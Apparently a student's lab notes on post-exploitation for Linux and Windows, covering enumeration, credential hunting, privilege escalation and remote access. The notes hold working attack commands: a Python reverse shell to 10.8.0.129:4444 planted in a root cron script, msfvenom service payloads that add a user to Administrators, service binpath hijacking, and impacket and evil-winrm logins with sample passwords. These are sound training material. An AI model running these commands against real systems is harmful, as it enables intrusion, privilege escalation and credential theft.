# Post exploitation


- pivot or lateral movement - host to another hosts/systems

1. extra information gathering 

2. priv escalation
root or local administrator 

[document](./4-2.%20In%20a%20target%20shell.md).
- where am I (in the current host)
    - username, group, priv, what function
    - whoami, hostname, OS version, ip address, route, ARP, network 

- files, services, processes
- what priv? RWX
- cronjob
```
env path 
file permission misconfig
misconf user or group permission
SUID 
sudo -i 
hardcoding conf file
```

### tip
- know default status features  
    - Ubuntu 22.04, server insatll > default users, files, services, process, etc.

- if it's different, Stealthy approach (always think first, and try)


## Linux
```
whoami : low
id : groups - webadmins 
hostname
groups
uname -a  : in AWS instance maybe, Ubuntu(Linux) version
uname -r 
cat /etc/os-release : ubuntu version detailed
hostnamectl
```

- Network
```
ip a / ifconfig
route -n
arp -a 
...
netstat -n : established ports, services name, -n numeric
netstat -ano : all, listened included
ss -ltnp : listened(opened) ports 
netstat -tulpna : PID, opened sessions
```

- processes (without thinking network) 
    - : what installed services? > how can I abuse this
```
ps -ef : running processes, and services 
ps faux : easy to see tree structured, if running process with vulnerable versions = easy to abuse 
systemctl --type=service --state=running : running service, with description 
```

- software installed 
```
dpkg --list : Debian/Ubuntu based OS
ls -alh /opt : (optional) directly installed SW without system package manager. 3rd party, no patched versions left 
```

- connection with another user or another host/systems?
```
/etc/passwd : > dbadmin user
/etc/group : webadmin
groups
groups low : low's groups 
```

- what can I do to upgrade? 


- file priv or services misconf > abuse 
```
.ssh : low/.ssh/ > sqladmin ssh private key acquired 
server misconfig
sudo -i
sudo -l : current user's sudo priv , can sudo vim without password
SUID misconfig

.bashrc_history
```

- ++what servers are installed? 
    - config files
```
find /etc -name '*.conf' 2>/dev/null : password acqure
log files
find /var/log -name '*.log' 2>/dev/null : another host or user's name acquired
777 perm
find / -type f -perm 0777 : /etc/passwd > add user or add user to groups or passwd setting without /etc/shadow ? 
SUID perm
find / -type f -perm -4000 2>/dev/null
```

- what environment am I
    - check if I'm in jail shell or container/docker 

1. shell variable check
```
echo $SHELL : current shell. or ls -lah /home/USER/.bashrc
echo $PATH : system's PATH environment variables, for setting globaly
env : current system's environment variables, e.g. AWS cloud key stored
export : environment variables , sensitive informations 
```

2. docker/kubernetes check
```
cat /proc/self/cgroup
ls -alh /.dockerenv : docker's env variables 
cat /etc/passwd
```


### automatic tools 
- it's hard to remember command > automatic tools 
    - OSCP much use 

    - LinPeas : information gathering 

- file transfer 
    - Kali -> Target host 
    1. scp FILE user1@Ip:/tmp/FILE
        - scp blank2.txt low@172.31.133.167:/home/low/blank2.txt
        - vice versa can : 
        - service ssh start
        - scp mefirst.txt kali@10.8.0.129:/home/kali/test/mefirst.txt

    2. ftp KALIIP PORT : kali - server vsftpd > target - get  
    3. nfs mount > write 
    4. smb smbclient put FILE  :
    ```
    systemctl start smbd
    /etc/samba/smb.conf > [jim] Disk create, and grant guest permissions. 
    smbmap -H 10.8.0.129
    smbclient \\\\10.8.0.129\\jim
    get FILE
    ```

    5. HTTP server- kali, wget - host : 
    ```
    python3 -m http.server 8081
    wget http://10.8.0.129:8081/html.txt
    ```

    - Target -> Kali : network service leverage 
```
scp FILE kali@IP:/tmp/test/FILE
blocked by firewall 
telnet test first if it's blocked or not > network service port
telnet KALI PORT 
telnet 10.8.0.129 21 : connected
telnet 10.8.0.129 445 : connected

  
apt install vsftpd
service vsftpd status 
systemctl status vsftpd
```


- LinPEAS
    - kali -> target 
```
wget https://github.com/peass-ng/PEASS-ng/releases/download/20240630-b2cfbe8a/linpeas.sh
curl -L https://github.com/peass-ng/PEASS-ng/releases/download/20240630-b2cfbe8a/linpeas.sh > linepeas.sh

scp linpeas.sh low@172.31.133.167:/home/low/linpeas.sh
chmod +x
./linpeas.sh | tee linpeas.output 

scp linpeas_result.txt kali@10.8.0.129:/home/kali/test
```
- password,creds file, password history files, hidden . files, web , DB, executable, UID GID SUID, shell variable , etc.



#### priv escalation
```
conf
cd /etc
ls -lah *.conf

grep -ri password *.conf : recursive 
```
- specific SW config files 

    - http : /var/www/html/
```
cat index.php
cat config.php > DB user acquired

ssh dbadmin@172.31.175.110
S3cretP@ssw0rd
```

- env : > creds hardcoding 
    - e.g. aws configure > development
    - AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY


- dpkg --list : SW vulns  can  know 
- ls -al /opt : optional dir - screen 4.5.0 > exploit DB serach 
    - sh script > send to target and execute. 




#### SUID
- execute as an owner of file 
```
find / -type f -perm -4000 2>/dev/null
gtfobins > abuse : screen-4.5.0, find , .. 
```



#### sudo  : I can use with higher priv
- sudo -l 
    - nopassword
    - I can use sudo on this user
        - vim > sudo vim -c ':!/bin/sh'


#### cron (job scheduler)
- specific date - auto execute routine
    - /etc/cron.d/
    - /etc/cron.*/ 
    - system manage 
 
- cron -l : current user cron
- ls -lahR /etc/cron* : systme's cron
- ls -lah /etc/cron*
    - abuse : revshell etc payload > php insert 


- cron -l : user too low, permissions denied
    - ls -lah /etc/cron.d system's cron 
    - cat backup : onetime-backup.py per minute with root 

```
echo "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.8.0.129',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')" > /tmp/onetime-backup.py : python script. 
```
- even though I'm not root, apply to current user


#### another user SSH  private key 
/home/user/.ssh/id_rsa

#### history file
/home/user/.bash_history (.zsh_history)

#### specific service's config file 
- /var/lib/mysql/DBNAME : database 
- /etc/my.conf : mysql conf?
- /var/www/html/config.php 

#### 777perm 
```
find / -type f -perm 0777
```
- ex) /etc/shadow > read - hash cracking, wrtiable - add hash
- /etc/passwd > add user root? 

#### env var
- e.g. cloud key (AWS, Azure, GCP)
    - Miscroservice, docker, Kubernetes(K8) creds or API key, they store a lot > access 


## windows
- account level 
    1. local low : in one host
    2. domain low : ex) raccoon.local\choi (in AD)
    3. service : to execute windows service ex) NetworkService, LocalSystem
    4. local admin : ex) Administrator (or HOST\Administrator) : can access specific host's config file. not all 
    5. SYSTEM : NT Authority\System, windows OS, services, and process use this high local account, not user account
```
local admin<> SYSTEM 
you can get system straight away : access token manipulation,  
 psexec > service create > SYSTEM account create 
 cronjob create 
one body

SYSTEM != highest priv
session 0 > usage limit : GUI access token, AD attack 
local admin = session 1++ > all can

in practice, attacker get
local admin first > SYSTEM 

a lot of credential dumping  : NT hash passwords 
SAM(Security Account Manager) - local users(~local admin) creds 
LSA(Local Security Authority) secrets - registry(windows setting helping - service account's password or IE, SQL, wifi, account > decrypt can)
LSASS(LSA Subsystem) - user's cashed hashes on the current interactive logon sessions
DPAPI(Data Protection API) - with DPAPI key, account information > decr
can. e.g. Internet browser, application etc 
>> credential stuffing


xfreerdp /u:redraccoon /p:'Password123!' /v:172.31.179.53 /dynamic-resolution

powershell
whoami 
whoami /priv : privilege names too many 
net user redraccoon
local group memberships - Remote Desktop Users, Remote management Users: winrm(or psremoting) network service access, Users(default)

net user : all user show, (Defaultaccount, WDA~, Guest - default , ignore), Administrator(default)
net localgroup : current host's group, windows default local group remember, > document

net user low : only RDP 
cd C:\Users : another users exist check (When AD, who host came to c:\users\ can check  )
USER.EC2AMAZ~ :  same user create 


what host am I in?
hostname : what server guess , amazon ec2

systeminfo.exe : important : OS version 2019 server, build number : version build 17763 - what year comes out ago and it's vulnerable for ~ google 
hotfix N/A : security patch X > kernel exploit or OS based vulnerability maybe

winver.exe : what Windows version detailed, version number: 1809 - 2018 released > this doesn't update later on?, ec2 = of course, security patch applied but in practice, not patched for 6 years

!what network this host connected around?  
arp -A  : layer2 (physically around) , .255 broadcast ignore, host .1 accessed to my host, ping can= connected, attack can 

layer 3
ipconfig /all  : !How many interface card do I have, Ethernet adapter ethernet 3 = NIC(Network interface Card)
if 2 NIC, Network A <> host <> Network B , help them connect between them
gathering : IP, gateway(apr -a connected host), DHCP server, DNS server 
> which location am I in the network, what connection > document

route PRINT : what type of network can I connect, send traffic
ex) 0.0.0.0 to go internet , through gateway


* what process , services 
ps : process name, PID, SI(session Id 0-OS based system service, 1or2 - as User), 
what function is it about this host? - abyss web server, httpd - web server, 
in practice, specific company's EDR solution running 

Get-Service : all services in currentl host
description apache web, DB, abysswebserver(stopped) - running is more useful 


Get-Service | Where-Object { $_.Status -eq "Running" } 
: parsing for each line 

what ports are open? : to find the localhost opened for itself.
netstat -ano : 0.0.0.0 opened to external, 127.0.0.1 - localhost only   , what process is open this port? > PID : ps | Where-Object { $_.Id -eq "2192" } , 9999 unusual - abyss ws (service stop, but process is running)

what software are installed?
see filesystem
C:\ : root dir, some SW are installed at root dir (CouchDB, xampp, SysinternalsSuite : tasks automatic tool = useful ) many thing installed

/opt < optional program 
usually win doesn't have /opt : Abyss web server installed 


Program files - 64bit usual,  (x86) - when install 32bit 
fresh !what files are in default, C:\Program Files


Notepad++ only installed manually 

guess
Packagemanagement : chocolatey installed
Amazon : EC2 


+ LastWriteTime 
EFI - default 2018
recent date = maybe recently install (Program Files, SysinternalSuite.. )


SW : couchDB - let's find out what is in database? , notepad++, xampp, .... > attack surfaces


* priv escalation
hard coding  : API key, RSA token, creds etc 
windows server conf: for using another network  

user device(host) : txt, md, powershell history


1. conf files, windows registry
installed dir path 
C:\
C:\Program files\
C:\Program files(x86)\

2. user home dir 
Desktop, Documents, Downloads

3. each user powershell history 
(Get-PSReadLineOption).HistorySavePath 

4. passw text Resursive 
Get-ChildItem -Path . -Recurse -Include *.ini,*.config,*.xml -ErrorAction SilentlyContinue | Select-String -Pattern 'passw' -CaseSensitive:$false | Group-Object Path | Foreach-Object { "[+] Potential plaintext creds: $($_.Name)" }


 Get-ChildItem -Path . -Recurse -Include *.ini,*.config,*.xml -ErrorAction SilentlyContinue : error ingore, and find 
 | Select-String -Pattern 'passw' -CaseSensitive:$false 
: = grep -i  

| Group-Object Path  : organized 
| Foreach-Object { $_.name } : only File name 


> cat [ini files] | Select-String -Pattern 'passwd' -CaseSensitive:$false
 
Select-String passw




admin = Password123!

password simple first, later on, I'm gonna change, but never



C:\Users\
usually don't make ini xml 
developer usually : md txt xslx docx csv


Get-ChildItem -Path . -Recurse -Include  *.ini,*.config,*.xml, *.txt,*.md,*.xslx,*.docx,*.csv -ErrorAction SilentlyContinue

Get-ChildItem -Path c:\Users -Recurse -Include  *.ini,*.config,*.xml, *.txt,*.md,*.xslx,*.docx,*.csv -ErrorAction SilentlyContinue | Select-String -Pattern 'passw|secret' -CaseSensitive | Group-Object Path | Foreach-Object { $_.Name } : passw or secret




powershell history file
Powershell file, changed many times 

Get-PSReadLineOption : historysavepath 
C:\Users\redraccoon\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat Path : before we come, Invoke-bhptinstall -username Administrator -password 'Password123!' -quickInstall > ssh or something acccess attempts > creds acquire
when someone redraccon access and install something using local adminitrator creds 


*Unattended file
Automated host provisioning 
500 workstation, setting 
job schedule , script, programs default

1. when creating default users, hardcoding 

2. executing script, creds ex) powershell history 
./install-googlechrome.ps1 -u Administrator -p 'Password123!' 

3. when creating job schedule, creds
New-ScheduledTaskAction [] -u Administrator -p 'Password123!'


path's differ from solutions 
usually panther
C:\windows\panther\unattend.xml 
C:\windows\panther\unattended.xml
C:\windows\panther\unattend\unattend.xml 
C:\windows\panther\unattend\unattended.xml 
C:\windows\system32\sysprep\sysprep.inf  : system preparation
C:\windows\system32\sysprep\sysprep.xml

Get-ChildItem -Path C:\Windows\ -Recurse -Include 'sysprep.inf', 'sysprep.xml', 'unattend.xml', 'unattended.xml' -Force -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName }
: -Force - even hidden file , C:\Windows\ too big, too much take a long time > reduce the file number 

cat .xml 
accounts create 
user1
action= add 
name admin
password - base64 (hash or encrypted )

user2
~

[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkADEAMgAzACEA')) : = echo 'BASE64' | base64 -d

Administrators 
admin:Password123!


setting 
<RunSynchronousCommand>
Once it starts, execute setting script 
: when you go out to Github, go through proxy using with proxy creds. > abuse proxy > attack anothers

misconfiguration = unattended file = world readable 



* Credential Manager
= Windows default pssword manager 
when executing, network, website/application, process, it bothers to type password every time as another user, 
when come again, don't need to type creds
encrypt creds with DPAPI(Data protection API, WinAPI) with user's key  

requirement : user stored creds
e.g. someone who needs to login many users : Help desk, sysadmin 


initial access as specific user 
> check if they use cred manager 
> decrypt or just directly use 
> process create that attacker want



creds check in cred manager 
GUI 
WEb credentials : edge, IE 
Windows credentials : application
CLI 
cmdkey /list

: but not Domain account


decrypt tools : mimikatz etc

credentialsmanager stored >> directly abuse can as another user 
usage 
RunAs /savecred /u:USER PROCESS 
RunAs /savecred /u:Administrator "powershell.exe" : local admin


stored creds file path 
C:\users\USER\Appdata\Roaming\Microsoft\Credentials 
DPAPI encrypted > complex 



* Unquoted Service Path
Service in Windows
ImagePath : path of service binary, ex) c:\apache\apache.exe 

execute with CreateProcess WinAPI function (first arg : LpApplicationName)
: wrongly designed > own order

in ImagePath 
1. if there's no " " quoted, 2. but space ,

own order
ImagePath - c:\Optional Program\Red Raccoon\~
> file search and execute Optional.exe 
...

malicious file create and execute

requirement
1. if there's no " " quoted, 
2. but space ,
3. check writable permissions in the path 
4. can if service restart or host reboot


Get-WmiObject Win32_Service | Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -notlike 'C:\Windows\*' } | Select-Object Name, DisplayName, PathName, StartMode


Get-WmiObject Win32_Service | Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -notlike 'C:\Windows\*' -and $_.PathName -notmatch '^\s*\".*\".*$' } | Select-Object Name, DisplayName, PathName, StartMode


permissions check
icacls c:\opt\ : all users have full privilege

accesschk : more readible
cd c:\sysinternalsSuite\ : sys binaries 
.\accesschk.exe -accepteula -q -d C:\opt 


Abyss.exe payload 
msfvenom -p windows/x64/exec CMD="net localgroup Administrators redraccoon /add" -f exe-service -o Abyss.exe : powershell commands simply execute

they are different structured or something
powershell.exe cmd.exe // service binary 
> we need to make service binary that abyss web server uses.
not exe 


python3 -m http.server 80 
wget http://10.8.0.129/Abyss.exe -O Abyss.exe 
wget http://10.8.0.129/Abyss.exe -outfile Abyss.exe 
: alias - Invoke-Webrequest


Restart-Service AbyssWebserver

net localgroup administrator 
net user redraccoon 
: included 



* misconfiguration service priv
specific users get mis priv. > 
service path replace or,
service binary itself replace
> payload execution 


what priv on these users
> 1. Service binPath(execute path) edit > as payload path 
2. Service Binary file replace : rarely use in practice 



cd c:\sysinternalsSuite\ 
accesschk 
: most of the hosts don't have this
> download from google  : windows sysinternals download  = utility tools : sysadmins use much, attackers too  

.\accesschk.exe -accepteula -ucqv redraccoon AbyssWebserver : what kind of priv does this user have? 
RW, allaccess

default group - Everyone, Users, Authenticated Users : if the user doesn't have priv, find out groups associated 


.\accesschk.exe -accepteula -ucqv Users AbyssWebserver : No priv for groups 

gathering 
sc.exe qc AbyssWebServer : give me feature, BINARY_PATH_NAME  > this user can edit > malicious payload's path

msfvenom -p windows/x64/exec CMD="net localgroup administrators redraccoon /delete" -f exe-service -o random3.exe 

wget http://10.8.0.129/random1.exe -Outfile random1.exe

sc.exe config AbyssWebserver binpath= "C:\Users\redracoon\Desktop\random1.exe" : !sc.exe , = "" blank 

>> to apply priv : run powershell as local admin


* windows remote access

linux 
ssh
telnet = ssh but not encrypted 
web : shell 
VNC : if target is linux, can access with GUI 

RDP 3389
WinRM 5985 5986
SMB 445
WMI 135

when we find out creds(Adminstrator:Password123!) > how to access?


WinRM
smbclient? 

evil-winrm 
psexec > netexec ?

*RDP
if port 3389 is open, MS Terminal Services, = RDP(Remote desktop Protocol) is running 
log in can - when the user is in RDP groups even though it's not in local administrators. : net localgroup 'Remote Desktop users'
xfreerdp /u:Administrator /p:Password123! /v:IP /dynamic-resolution
rdesktop -u Administrator -p 'Password123!' 172.31.134.61
: if it's not working, alternative

*WinRM - Windows Remote Management
web based, Soap
HTTP/HTTPS - 5985/5986
evil-winrm -i 172.31.134.61 -u Administrator -p 'Password123!'
evil-winrm -i 172.31.134.61 -u redraccon -p 'Password123!'
 : shell get(is like SSH), best tool, kali installed  , PS powershell based,  
 in practice, really use much , admin, solution, scripts use much > attacker use much 

*SMB
: Remote code execution can  by using psexec
similar with psexec 
impacket : python based windows tools
sudo apt update -y
sudo apt install impacket-scripts 

impacket-psexec domain\\ : AD
impacket-psexec Administrator:'Password123!'@172.31.134.61  : get shell with paexec way, file upload at ADMIN$ (c:\windows\system32) admin share 
SMB can > RPC (SCM servicemanager) can , it means create new services on the target host > file binary exe execute > trigger
that's why psexec needs a Local Administrator to create and upload , can get SYSTEM priv, when exit, artifact removed automatically 

*WMI 
135 - msrpc 
445 - microsoft-ds
impacket-wmiexec Administrator:'Password123!'@172.31.134.61
get shell using WMI, not create service binary etc., but need to log in with Local Administrator

SMB, WMI - Local Administrator  = necessary 
RDP, WinRM  - Remote Desktop Users / Remote Management Users

 if get creds > which kind of service should I use?
 
```